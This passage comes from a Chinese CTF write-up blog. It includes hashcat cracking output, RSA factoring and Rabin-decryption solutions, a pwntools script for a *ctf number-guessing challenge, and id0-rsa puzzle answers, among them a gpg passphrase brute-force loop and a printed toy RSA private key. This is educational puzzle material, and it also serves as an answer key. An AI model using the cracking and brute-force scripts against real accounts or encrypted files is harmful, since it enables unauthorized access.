(3 secs)</span><br><span class="line">Time.Estimated...: Fri May 11 01:17:24 2018 (0 secs)</span><br><span class="line">Guess.Base.......: File (rockyou.txt)</span><br><span class="line">Guess.Queue......: 1/1 (100.00%)</span><br><span class="line">Speed.Dev.<span class="comment">#1.....:    91621 H/s (10.79ms) @ Accel:32 Loops:16 Thr:1024 Vec:1</span></span><br><span class="line">Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts</span><br><span class="line">Progress.........: 593466/14344383 (4.14%)</span><br><span class="line">Rejected.........: 331322/593466 (55.83%)</span><br><span class="line">Restore.Point....: 0/14344383 (0.00%)</span><br><span class="line">Candidates.<span class="comment">#1....: 123456789 -&gt; rinabelle</span></span><br><span class="line">HWMon.Dev.<span class="comment">#1.....: Temp: 68c Util: 98% Core:1151MHz Mem:2505MHz Bus:16</span></span><br><span class="line"></span><br><span class="line">Started: Fri May 11 01:17:04 2018</span><br><span class="line">Stopped: Fri May 11 01:17:25 2018</span><br></pre></td></tr></table></figure><h3 id="flag-22"><a href="#flag-22" class="headerlink" title="flag"></a>flag</h3><p>flag{11223344}</p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="[　] Crypto"></a>[　] Crypto</h1><h2 id="X-Medium-RSA"><a href="#X-Medium-RSA" class="headerlink" title="[Ｘ] Medium RSA"></a>[Ｘ] Medium RSA</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">λ openssl rsa -pubin -<span class="keyword">in</span> pubkey.pem -text -modulus</span><br><span class="line">WARNING: can<span class="string">'t open config file: /usr/local/ssl/openssl.cnf</span></span><br><span class="line"><span class="string">Public-Key: (256 bit)</span></span><br><span class="line"><span class="string">Modulus:</span></span><br><span class="line"><span class="string">    00:c2:63:6a:e5:c3:d8:e4:3f:fb:97:ab:09:02:8f:</span></span><br><span class="line"><span class="string">    1a:ac:6c:0b:f6:cd:3d:70:eb:ca:28:1b:ff:e9:7f:</span></span><br><span class="line"><span class="string">    be:30:dd</span></span><br><span class="line"><span class="string">Exponent: 65537 (0x10001)</span></span><br><span class="line"><span class="string">Modulus=C2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DD</span></span><br><span class="line"><span class="string">writing RSA key</span></span><br><span class="line"><span class="string">-----BEGIN PUBLIC KEY-----</span></span><br><span class="line"><span class="string">MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhAMJjauXD2OQ/+5erCQKPGqxsC/bNPXDr</span></span><br><span class="line"><span class="string">yigb/+l/vjDdAgMBAAE=</span></span><br><span class="line"><span class="string">-----END PUBLIC KEY-----</span></span><br></pre></td></tr></table></figure><p>然后分解这个数，用RSAtools输出私钥文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">λ python rsatool.py -f PEM -o key.pem -p 275127860351348928173285174381581152299 -q 319576316814478949870590164193048 041239</span><br><span class="line">Using (p, q) to initialise RSA instance</span><br><span class="line"></span><br><span class="line">n =</span><br><span class="line">c2636ae5c3d8e43ffb97ab09028f1aac6c0bf6cd3d70ebca281bffe97fbe30dd</span><br><span class="line"></span><br><span class="line">e = 65537 (0x10001)</span><br><span class="line"></span><br><span class="line">d =</span><br><span class="line">1806799bd44ce649122b78b43060c786f8b77fb1593e0842da063ba0d8728bf1</span><br><span class="line"></span><br><span class="line">p = 275127860351348928173285174381581152299 (0xcefbb2cf7e18a98ebedc36e3e7c3b02b)</span><br><span class="line"></span><br><span class="line">q = 319576316814478949870590164193048041239 (0xf06c28e91c8922b9c236e23560c09717)</span><br><span class="line"></span><br><span class="line">Saving PEM as key.pem</span><br></pre></td></tr></table></figure><p>之后解密</p><p><code>λ openssl rsautl -decrypt -inkey key.pem -in flag.enc -out flag</code></p><h3 id="flag-23"><a href="#flag-23" class="headerlink" title="flag"></a>flag</h3><p>PCTF{256b_i5_m3dium}</p><h2 id="BrokenPic"><a href="#BrokenPic" class="headerlink" title="[　] BrokenPic"></a>[　] BrokenPic</h2><h3 id="flag-24"><a href="#flag-24" class="headerlink" title="flag"></a>flag</h3><h2 id="X-hard-RSA"><a href="#X-hard-RSA" class="headerlink" title="[Ｘ] hard RSA"></a>[Ｘ] hard RSA</h2><h2 id="RSA-衍生算法——Rabin-算法"><a href="#RSA-衍生算法——Rabin-算法" class="headerlink" title="RSA 衍生算法——Rabin 算法"></a>RSA 衍生算法——Rabin 算法</h2><h3 id="攻击条件"><a href="#攻击条件" class="headerlink" title="攻击条件"></a>攻击条件</h3><p> Rabin 算法的特征在于 $e=2​$。</p><h3 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h3><blockquote><p>密文：</p><p>$c=m^2\mod n$</p><p>解密：</p><ul><li>计算出 $m^p$ 和 $m^q$：</li></ul><p>$$m_p=\sqrt{c}\mod p$$</p><p>$$m_q=\sqrt{c}\mod q$$</p><ul><li>用扩展欧几里得计算出 $y_p$ 和 $y_q$：</li></ul><p>$y_p⋅p+y_q⋅q=1$</p><ul><li>解出四个明文：</li></ul><p>$$a=(y_p⋅p⋅m_q+y_q⋅q⋅m_p)modn$$</p><p>$$b=n−a$$</p><p>$$c=(y_p⋅p⋅m_q−y_q⋅q⋅m_p)modn$$</p><p>$$d=n−c$$</p><p>注意：如果 $$p≡q≡3(mod4)$$，则</p><p>$$mp=c^{\frac{1}{4}(p+1)}modp$$</p><p>$$mq=c^{\frac14(q+1)}modq$$</p><p>而一般情况下，$p≡q≡3(mod4)p $是满足的，对于不满足的情况下，请参考相应的算法解决。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取公钥参数</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'pubkey.pem'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    key = RSA.importKey(f)</span><br><span class="line">    N = key.n</span><br><span class="line">    e = key.e</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'flag.enc'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    cipher = f.read().encode(<span class="string">'hex'</span>)</span><br><span class="line">    cipher = string.atoi(cipher, base=<span class="number">16</span>)</span><br><span class="line">    <span class="comment"># print cipher</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"please input p"</span></span><br><span class="line">p = int(raw_input(), <span class="number">10</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'please input q'</span></span><br><span class="line">q = int(raw_input(), <span class="number">10</span>)</span><br><span class="line"><span class="comment"># 计算yp和yq</span></span><br><span class="line">inv_p = gmpy2.invert(p, q)</span><br><span class="line">inv_q = gmpy2.invert(q, p)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算mp和mq</span></span><br><span class="line">mp = pow(cipher, (p + <span class="number">1</span>) / <span class="number">4</span>, p)</span><br><span class="line">mq = pow(cipher, (q + <span class="number">1</span>) / <span class="number">4</span>, q)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算a,b,c,d</span></span><br><span class="line">a = (inv_p * p * mq + inv_q * q * mp) % N</span><br><span class="line">b = N - int(a)</span><br><span class="line">c = (inv_p * p * mq - inv_q * q * mp) % N</span><br><span class="line">d = N - int(c)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> (a, b, c, d):</span><br><span class="line">    s = <span class="string">'%x'</span> % i</span><br><span class="line">    <span class="keyword">if</span> len(s) % <span class="number">2</span> != <span class="number">0</span>:</span><br><span class="line">        s = <span class="string">'0'</span> + s</span><br><span class="line">    <span class="keyword">print</span> s.decode(<span class="string">'hex'</span>)</span><br></pre></td></tr></table></figure><h3 id="flag-25"><a href="#flag-25" class="headerlink" title="flag"></a>flag</h3><p>PCTF{sp3ci4l_rsa}</p>]]></content>
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Crypto </tag>
            
            <tag> Misc </tag>
            
            <tag> PWN </tag>
            
            <tag> Web </tag>
            
            <tag> Rev </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>*ctf magic_number WP</title>
      <link href="/ctf-magic-number-WP/"/>
      <url>/ctf-magic-number-WP/</url>
      <content type="html"><![CDATA[<p>99次内猜14个[0,1023]内的数，那肯定是不仅二分而且要整体二分了</p><p>简单说来是</p><a id="more"></a><img src="/ctf-magic-number-WP/1524837016603.png" title="伪代码"><p>于是可以写出代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">"47.89.18.224"</span>, <span class="number">10011</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">nums = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">query</span><span class="params">(l, r, rm)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Send the query and get answer</span></span><br><span class="line"><span class="string">    :param l: &lt;int&gt; left bound</span></span><br><span class="line"><span class="string">    :param r: &lt;int&gt; Right bound</span></span><br><span class="line"><span class="string">    :param rm: &lt;remote&gt; Remote process</span></span><br><span class="line"><span class="string">    :return: Amount of numbers</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    payload =<span class="string">"? "</span> + str(l) + <span class="string">" "</span> + str(r) + <span class="string">"\n"</span></span><br><span class="line">    rm.send(payload)</span><br><span class="line">    res = int(rm.recv())</span><br><span class="line">    <span class="keyword">print</span> payload + str(res)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find</span><span class="params">(l, r, k, rm)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Guess numbers</span></span><br><span class="line"><span class="string">    :param l: &lt;int&gt; Left bound</span></span><br><span class="line"><span class="string">    :param r: &lt;int&gt; Right bound</span></span><br><span class="line"><span class="string">    :param k: &lt;int&gt; Amount of numbers</span></span><br><span class="line"><span class="string">    :param rm: &lt;remote&gt; Remote process</span></span><br><span class="line"><span class="string">    :return: None</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">global</span> nums</span><br><span class="line">    <span class="keyword">if</span> l == r - <span class="number">1</span> <span class="keyword">and</span> k == <span class="number">1</span>:</span><br><span class="line">        nums.append(l)</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line">    m = (l + r) // <span class="number">2</span></span><br><span class="line">    K = query(l, m, rm)</span><br><span class="line">    <span class="keyword">if</span> K:</span><br><span class="line">        find(l, m, K, rm)</span><br><span class="line">    <span class="keyword">if</span> K - k:</span><br><span class="line">        find(m, r, k - K, rm)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gate</span><span class="params">(rm)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    gate</span></span><br><span class="line"><span class="string">    :param rm: &lt;remote&gt; Remote process</span></span><br><span class="line"><span class="string">    :return: None</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">global</span> nums</span><br><span class="line">    rm.recvuntil(<span class="string">"n = "</span>)</span><br><span class="line">    k = int(rm.recv())</span><br><span class="line">    nums = []</span><br><span class="line">    find(<span class="number">0</span>, <span class="number">1024</span>, k, r)</span><br><span class="line">    nums.sort()</span><br><span class="line">    print(nums)</span><br><span class="line">    rm.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gate(r)</span><br><span class="line">gate(r)</span><br><span class="line">gate(r)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里gate(r)一次就过一关，多少关我也忘了</span></span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PPC </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>id0-rsa WP合集</title>
      <link href="/id0-rsa-WP%E5%90%88%E9%9B%86/"/>
      <url>/id0-rsa-WP%E5%90%88%E9%9B%86/</url>
      <content type="html"><![CDATA[<p>忙里偷闲做做题wwwwwwwwwwwww</p><a id="more"></a><h1 id="进度表"><a href="#进度表" class="headerlink" title="进度表"></a>进度表</h1><ul><li style="list-style: none"><input type="checkbox" checked> <a href="https://id0-rsa.pub/problem/18/" target="_blank" rel="noopener">Intro to Hashing</a></li><li style="list-style: none"><input type="checkbox" checked> <a href="https://id0-rsa.pub/problem/19/" target="_blank" rel="noopener">Intro to PGP</a></li><li style="list-style: none"><input type="checkbox" checked> <a href="https://id0-rsa.pub/problem/1/" target="_blank" rel="noopener">Hello PGP</a></li><li style="list-style: none"><input type="checkbox" checked> <a href="https://id0-rsa.pub/problem/3/" target="_blank" rel="noopener">Hello OpenSSL</a></li><li style="list-style: none"><input type="checkbox" checked> <a href="https://id0-rsa.pub/problem/21/" target="_blank" rel="noopener">Intro to RSA</a></li><li style="list-style: none"><input type="checkbox" checked> <a href="https://id0-rsa.pub/problem/32/" target="_blank" rel="noopener">Caesar</a></li><li style="list-style: none"><input type="checkbox" checked> <a href="https://id0-rsa.pub/problem/2/" target="_blank" rel="noopener">Hello Bitcoin</a></li><li style="list-style: none"><input type="checkbox" checked> <a href="https://id0-rsa.pub/problem/8/" target="_blank" rel="noopener">Ps and Qs</a></li><li style="list-style: none"><input type="checkbox" checked> <a href="https://id0-rsa.pub/problem/5/" target="_blank" rel="noopener">Affine Cipher</a></li><li style="list-style: none"><input type="checkbox" checked> <a href="https://id0-rsa.pub/problem/26/" target="_blank" rel="noopener">Cut and Paste Attack On AES-ECB</a></li><li style="list-style: none"><input type="checkbox" checked> <a href="https://id0-rsa.pub/problem/34/" target="_blank" rel="noopener">Rail Fence</a></li><li style="list-style: none"><input type="checkbox" checked> <a href="https://id0-rsa.pub/problem/15/" target="_blank" rel="noopener">Factoring RSA With CRT Optimization</a></li><li style="list-style: none"><input type="checkbox" checked> <a href="https://id0-rsa.pub/problem/38/" target="_blank" rel="noopener">Easy Passwords</a></li><li style="list-style: none"><input type="checkbox" checked> <a href="https://id0-rsa.pub/problem/45/" target="_blank" rel="noopener">RSA Modulus Factorization</a></li><li style="list-style: none"><input type="checkbox" checked> <a href="https://id0-rsa.pub/problem/24/" target="_blank" rel="noopener">Fast Hashing Passwords</a></li><li style="list-style: none"><input type="checkbox" checked> <a href="https://id0-rsa.pub/problem/33/" target="_blank" rel="noopener">Vigenère</a></li><li style="list-style: none"><input type="checkbox" checked> <a href="https://id0-rsa.pub/problem/12/" target="_blank" rel="noopener">Monoalphabetic Cipher</a></li><li style="list-style: none"><input type="checkbox" checked> <a href="https://id0-rsa.pub/problem/25/" target="_blank" rel="noopener">Salt Alone Won&#39;t Save You</a></li><li style="list-style: none"><input type="checkbox" checked> <a href="https://id0-rsa.pub/problem/23/" target="_blank" rel="noopener">CCA on Textbook RSA</a></li><li style="list-style: none"><input type="checkbox"> <a href="https://id0-rsa.pub/problem/4/" target="_blank" rel="noopener">AES-CTR with Nonce Reuse</a></li><li style="list-style: none"><input type="checkbox" checked> <a href="https://id0-rsa.pub/problem/30/" target="_blank" rel="noopener">Bad Entropy</a></li><li style="list-style: none"><input type="checkbox"> <a href="https://id0-rsa.pub/problem/6/" target="_blank" rel="noopener">Double Strength Affine</a></li><li style="list-style: none"><input type="checkbox"> <a href="https://id0-rsa.pub/problem/16/" target="_blank" rel="noopener">Rainbow Table Hash Chain</a></li><li style="list-style: none"><input type="checkbox"> <a href="https://id0-rsa.pub/problem/10/" target="_blank" rel="noopener">Elliptic Curve Private Key Recovery</a></li><li style="list-style: none"><input type="checkbox"> <a href="https://id0-rsa.pub/problem/17/" target="_blank" rel="noopener">ECDSA Nonce Recovery</a></li><li style="list-style: none"><input type="checkbox"> <a href="https://id0-rsa.pub/problem/41/" target="_blank" rel="noopener">Slightly harder passwords</a></li><li style="list-style: none"><input type="checkbox"> <a href="https://id0-rsa.pub/problem/40/" target="_blank" rel="noopener">Upgraded Affine</a></li><li style="list-style: none"><input type="checkbox"> <a href="https://id0-rsa.pub/problem/39/" target="_blank" rel="noopener">Fvtavat Xrl Erpbirel</a></li><li style="list-style: none"><input type="checkbox" checked> <a href="https://id0-rsa.pub/problem/9/" target="_blank" rel="noopener">Insufficient Key Size</a></li><li style="list-style: none"><input type="checkbox"> <a href="https://id0-rsa.pub/problem/11/" target="_blank" rel="noopener">Håstad&#39;s Broadcast Attack</a></li><li style="list-style: none"><input type="checkbox"> <a href="https://id0-rsa.pub/problem/22/" target="_blank" rel="noopener">CBC Padding Attack</a></li><li style="list-style: none"><input type="checkbox"> <a href="https://id0-rsa.pub/problem/29/" target="_blank" rel="noopener">Breaking PDF Passwords</a></li><li style="list-style: none"><input type="checkbox" checked> <a href="https://id0-rsa.pub/problem/35/" target="_blank" rel="noopener">Vigenère + Rail Fence</a></li><li style="list-style: none"><input type="checkbox" checked> <a href="https://id0-rsa.pub/problem/43/" target="_blank" rel="noopener">Recover the secret phone number</a></li><li style="list-style: none"><input type="checkbox"> <a href="https://id0-rsa.pub/problem/42/" target="_blank" rel="noopener">Optimal Backpack Allocation</a></li><li style="list-style: none"><input type="checkbox"> <a href="https://id0-rsa.pub/problem/27/" target="_blank" rel="noopener">Insecure PRNG</a></li><li style="list-style: none"><input type="checkbox"> <a href="https://id0-rsa.pub/problem/13/" target="_blank" rel="noopener">Playfair</a></li><li style="list-style: none"><input type="checkbox"> <a href="https://id0-rsa.pub/problem/20/" target="_blank" rel="noopener">CRIMEs against TLS</a></li><li style="list-style: none"><input type="checkbox"> <a href="https://id0-rsa.pub/problem/14/" target="_blank" rel="noopener">Bleichenbacher&#39;s CCA2 on RSA</a></li><li style="list-style: none"><input type="checkbox"> <a href="https://id0-rsa.pub/problem/31/" target="_blank" rel="noopener">Backdoored PRNG</a></li><li style="list-style: none"><input type="checkbox"> <a href="https://id0-rsa.pub/problem/37/" target="_blank" rel="noopener">Not So Safe Primes</a></li><li style="list-style: none"><input type="checkbox"> <a href="https://id0-rsa.pub/problem/44/" target="_blank" rel="noopener">DSA with LCG nonces</a></li></ul><h1 id="Intro-to-Hashing"><a href="#Intro-to-Hashing" class="headerlink" title="Intro to Hashing"></a>Intro to Hashing</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Python</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>hashlib.md5(hashlib.sha256(<span class="string">'id0-rsa.pub'</span>).hexdigest()).hexdigest()</span><br><span class="line"><span class="comment"># 'b25d449d86aa07981d358d3b71b891de'</span></span><br></pre></td></tr></table></figure><h1 id="Intro-to-PGP"><a href="#Intro-to-PGP" class="headerlink" title="Intro to PGP"></a>Intro to PGP</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root@kali:~/Documents/id0-rsa<span class="comment"># touch Intro_to_PGP.key</span></span><br><span class="line">root@kali:~/Documents/id0-rsa<span class="comment"># gpg --import Intro_to_PGP.key </span></span><br><span class="line">gpg: key 2503D0F1A81B09D4: public key <span class="string">"id0-rsa.pub (http://id0-rsa.pub) &lt;id0rsa.pub@gmail.com&gt;"</span> imported</span><br><span class="line">gpg: Total number processed: 1</span><br><span class="line">gpg:               imported: 1</span><br><span class="line">root@kali:~/Documents/id0-rsa<span class="comment"># touch Intro_to_PGP.txt</span></span><br><span class="line">root@kali:~/Documents/id0-rsa<span class="comment"># gpg -d Intro_to_PGP.txt</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Thank you Phil Zimmermann!</span></span><br></pre></td></tr></table></figure><h1 id="Hello-PGP"><a href="#Hello-PGP" class="headerlink" title="Hello PGP"></a>Hello PGP</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">count=1</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">read</span> WORD; <span class="keyword">do</span></span><br><span class="line">gpg --batch --passphrase <span class="variable">$WORD</span> --decrypt test.txt 2&gt;/dev/null</span><br><span class="line"><span class="keyword">if</span> [ $? -eq 0 ]; <span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> </span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$WORD</span></span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line">count=$(( count + 1 ))</span><br><span class="line"><span class="keyword">if</span> [ $((count % 1000)) -eq 0 ]; <span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$count</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span> &lt; words</span><br><span class="line"></span><br><span class="line"><span class="comment"># passionately apathetic</span></span><br><span class="line"><span class="comment"># seamanship</span></span><br><span class="line"><span class="comment"># gpg: AES256 encrypted data</span></span><br><span class="line"><span class="comment"># gpg: encrypted with 1 passphrase</span></span><br></pre></td></tr></table></figure><h1 id="Hello-OpenSSL"><a href="#Hello-OpenSSL" class="headerlink" title="Hello OpenSSL"></a>Hello OpenSSL</h1><h2 id="繁琐的解法"><a href="#繁琐的解法" class="headerlink" title="繁琐的解法"></a>繁琐的解法</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line">root@kali:~/Documents/id0-rsa/Hello_OpenSSL<span class="comment"># openssl rsa -in priva.pem -text</span></span><br><span class="line">Private-Key: (256 bit)</span><br><span class="line">modulus:</span><br><span class="line">    00:e6:dc:a0:a5:26:5d:39:95:0c:7e:e3:b7:a1:31:</span><br><span class="line">    96:47:87:00:2c:1b:56:ba:2e:54:ce:b4:30:db:ff:</span><br><span class="line">    09:95:9d</span><br><span class="line">publicExponent: 65537 (0x10001)</span><br><span class="line">privateExponent:</span><br><span class="line">    00:8f:67:e1:8a:75:28:57:ca:94:76:85:f1:dd:79:</span><br><span class="line">    b6:05:0e:35:05:e7:f9:ed:da:23:e6:de:14:aa:22:</span><br><span class="line">    d9:78:a9</span><br><span class="line">prime1:</span><br><span class="line">    00:fd:99:07:3e:67:03:c1:72:2a:96:81:ab:9a:29:</span><br><span class="line">    db:d7</span><br><span class="line">prime2:</span><br><span class="line">    00:e9:0c:76:fe:de:98:c1:9d:d3:c8:30:c0:e4:3a:</span><br><span class="line">    8b:ab</span><br><span class="line">exponent1:</span><br><span class="line">    00:b4:a6:37:17:c7:d0:50:14:20:ac:58:30:c2:c0:</span><br><span class="line">    00:bf</span><br><span class="line">exponent2:</span><br><span class="line">    00:c5:87:27:25:07:8e:fa:2c:c7:e0:9a:52:24:1f:</span><br><span class="line">    eb:59</span><br><span class="line">coefficient:</span><br><span class="line">    00:e3:bd:9b:a2:47:11:68:33:2d:80:fe:7d:ed:34:</span><br><span class="line">    de:<span class="built_in">fc</span></span><br><span class="line">writing RSA key</span><br><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MIGtAgEAAiEA5tygpSZdOZUMfuO3oTGWR4cALBtWui5UzrQw2/8JlZ0CAwEAAQIh</span><br><span class="line">AI9n4Yp1KFfKlHaF8d15tgUONQXn+e3aI+beFKoi2XipAhEA/ZkHPmcDwXIqloGr</span><br><span class="line">minb1wIRAOkMdv7emMGd08gwwOQ6i6sCEQC0pjcXx9BQFCCsWDDCwAC/AhEAxYcn</span><br><span class="line">JQeO+izH4JpSJB/rWQIRAOO9m6JHEWgzLYD+fe003vw=</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Python</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>n = <span class="number">0xe6dca0a5265d39950c7ee3b7a131964787002c1b56ba2e54ceb430dbff09959d</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d = <span class="number">0x8f67e18a752857ca947685f1dd79b6050e3505e7f9edda23e6de14aa22d978a9</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>c = <span 